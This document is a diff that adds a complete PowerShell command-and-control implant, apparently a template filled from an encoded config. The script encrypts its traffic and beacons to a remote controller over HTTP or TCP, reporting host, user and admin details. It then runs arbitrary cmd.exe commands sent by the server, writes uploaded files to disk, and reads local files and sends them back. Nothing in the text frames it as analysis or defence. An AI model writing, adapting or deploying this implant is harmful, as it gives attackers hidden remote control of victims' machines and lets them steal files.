@@ -1,0 +1,89 @@
+$ErrorActionPreference='Stop'
+$C=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{{.Config}}'))|ConvertFrom-Json
+
+function K($m,$l){$h=[Security.Cryptography.SHA256]::Create();$rb=[Convert]::FromBase64String($m);$lb=[Text.Encoding]::UTF8.GetBytes($l);$buf=New-Object byte[] ($rb.Length+$lb.Length);[Array]::Copy($rb,0,$buf,0,$rb.Length);[Array]::Copy($lb,0,$buf,$rb.Length,$lb.Length);$b=$h.ComputeHash($buf);$h.Dispose();return $b}
+function D($k,$s){
+  $r=[Convert]::FromBase64String($s)
+  if($r.Length -lt 48){throw 'short'}
+  $iv=$r[0..15];$mo=$r.Length-32;$ct=$r[16..($mo-1)];$mac=$r[$mo..($r.Length-1)]
+  $hk=New-Object Security.Cryptography.HMACSHA256(,(K $k 'mac'));$c=$hk.ComputeHash([byte[]]($iv+$ct));$hk.Dispose()
+  $eq=$true;for($i=0;$i -lt 32;$i++){if($c[$i] -ne $mac[$i]){$eq=$false}}
+  if(-not $eq){throw 'mac'}
+  $a=[Security.Cryptography.Aes]::Create();$a.Mode='CBC';$a.Padding='PKCS7'
+  $a.Key=K $k 'enc';$a.IV=$iv
+  $d=$a.CreateDecryptor();$p=$d.TransformFinalBlock($ct,0,$ct.Length);$d.Dispose();$a.Dispose()
+  return [Text.Encoding]::UTF8.GetString($p)
+}
+function E($k,$s){
+  $a=[Security.Cryptography.Aes]::Create();$a.Mode='CBC';$a.Padding='PKCS7'
+  $a.Key=K $k 'enc';$a.GenerateIV();$iv=$a.IV
+  $b=[Text.Encoding]::UTF8.GetBytes($s)
+  $d=$a.CreateEncryptor();$ct=$d.TransformFinalBlock($b,0,$b.Length);$d.Dispose();$a.Dispose()
+  $hk=New-Object Security.Cryptography.HMACSHA256(,(K $k 'mac'));$mac=$hk.ComputeHash([byte[]]($iv+$ct));$hk.Dispose()
+  return [Convert]::ToBase64String([byte[]]($iv+$ct+$mac))
+}
+
+$CBCEncrypt=${function:E};$CBCDecrypt=${function:D}
+function E($k,$s){
+ if($C.envelope -ne 'gcm'){return (& $CBCEncrypt $k $s)}
+ $a=[Security.Cryptography.AesGcm]::new([Convert]::FromBase64String($k));$n=New-Object byte[] 12;$rng=[Security.Cryptography.RandomNumberGenerator]::Create();$rng.GetBytes($n);$rng.Dispose()
+ $p=[Text.Encoding]::UTF8.GetBytes($s);$ct=New-Object byte[] $p.Length;$tag=New-Object byte[] 16;$a.Encrypt($n,$p,$ct,$tag);$a.Dispose()
+ return [Convert]::ToBase64String([byte[]]($n+$ct+$tag))
+}
+function D($k,$s){
+ if($C.envelope -ne 'gcm'){return (& $CBCDecrypt $k $s)}
+ $r=[Convert]::FromBase64String($s);if($r.Length -lt 28){throw 'short'};$n=$r[0..11];$tag=$r[($r.Length-16)..($r.Length-1)];$ct=$r[12..($r.Length-17)];$p=New-Object byte[] $ct.Length
+ $a=[Security.Cryptography.AesGcm]::new([Convert]::FromBase64String($k));$a.Decrypt($n,$ct,$tag,$p);$a.Dispose();return [Text.Encoding]::UTF8.GetString($p)
+}
+if($C.envelope -eq 'gcm' -and -not ('Security.Cryptography.AesGcm' -as [type])){throw 'GCM requires PowerShell 7 with modern .NET'}
+function Exchange($body){
+ if($C.transport -ne 'tcp'){return Invoke-RestMethod -Uri $C.url -Method Post -Body $body -ContentType 'application/json' -Headers @{'X-Implant-Token'=$C.token} -UseBasicParsing -TimeoutSec 30}
+ if(-not $script:Tcp){$script:Tcp=[Net.Sockets.TcpClient]::new();$script:Tcp.Connect($C.host,[int]$C.port);$script:Stream=$script:Tcp.GetStream();$script:Stream.ReadTimeout=90000}
+ $b=[Text.Encoding]::UTF8.GetBytes($body);$h=[BitConverter]::GetBytes([Net.IPAddress]::HostToNetworkOrder([int]$b.Length));$script:Stream.Write($h,0,4);$script:Stream.Write($b,0,$b.Length)
+ $h=New-Object byte[] 4;$off=0;while($off -lt 4){$n=$script:Stream.Read($h,$off,4-$off);if($n -le 0){throw 'closed'};$off+=$n}
+ $len=[Net.IPAddress]::NetworkToHostOrder([BitConverter]::ToInt32($h,0));if($len -lt 1 -or $len -gt 4194304){throw 'frame too large'};$b=New-Object byte[] $len;$off=0
+ while($off -lt $len){$n=$script:Stream.Read($b,$off,$len-$off);if($n -le 0){throw 'closed'};$off+=$n};return ([Text.Encoding]::UTF8.GetString($b)|ConvertFrom-Json)
+}
+function S($o){return ($o|ConvertTo-Json -Compress -Depth 6)}
+function Info(){
+ $u=if($env:USERNAME){$env:USERNAME}else{'?'}
+ $adm=$false
+ try{$adm=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
+ $os='windows';$ar='x64'
+ if([Environment]::Is64BitOperatingSystem -eq $false){$ar='x86'}
+ $pn='?';try{$pn=[Diagnostics.Process]::GetCurrentProcess().ProcessName}catch{}
+ return @{uuid=$C.uuid;hostname=$env:COMPUTERNAME;username=$u;os=$os;arch=$ar;pid=$PID;process_name=$pn;is_admin=$adm;internal_ip='';sleep_secs=$C.interval}
+}
+while($true){
+ try{
+  $i=S @{type='checkin';token=$C.token;implant=(Info)}
+  $b=S @{d=(E $C.key $i)}
+  $r=Exchange $b
+  if($r.d){
+   $m=(D $C.key $r.d)|ConvertFrom-Json
+   $res=@()
+   foreach($t in $m.tasks){
+    $out='';$er=''
+    try{
+     if($t.type -eq 'shell'){
+      $out=(& cmd.exe /c $t.command 2>&1|Out-String)
+     }elseif($t.type -eq 'sleep'){$C.interval=[int]$t.arg}
+     elseif($t.type -in @('exit','kill')){exit}
+     elseif($t.type -eq 'upload'){
+      [IO.File]::WriteAllBytes($t.path,[Convert]::FromBase64String($t.data));$out='uploaded'
+     }elseif($t.type -eq 'download'){
+      if((Get-Item -LiteralPath $t.path).Length -gt 2097152){throw 'download exceeds 2 MiB'}
+      $out=[Convert]::ToBase64String([IO.File]::ReadAllBytes($t.path))
+     }else{throw ('unsupported task type: '+$t.type)}
+    }catch{$er=$_.Exception.Message}
+    $st='success';if($er){$st='failed'}$res+=@{id=$t.id;output=$out;error=$er;status=$st}
+   }
+   if($res.Count -gt 0){
+    $rc=S @{type='result';session_id=$m.session_id;results=$res}
+    $rb=S @{d=(E $C.key $rc)}
+    Exchange $rb|Out-Null
+   }
+  }
+ }catch{if($script:Tcp){$script:Tcp.Close();$script:Tcp=$null}}
+ Start-Sleep -Seconds ([int]$C.interval)
+}
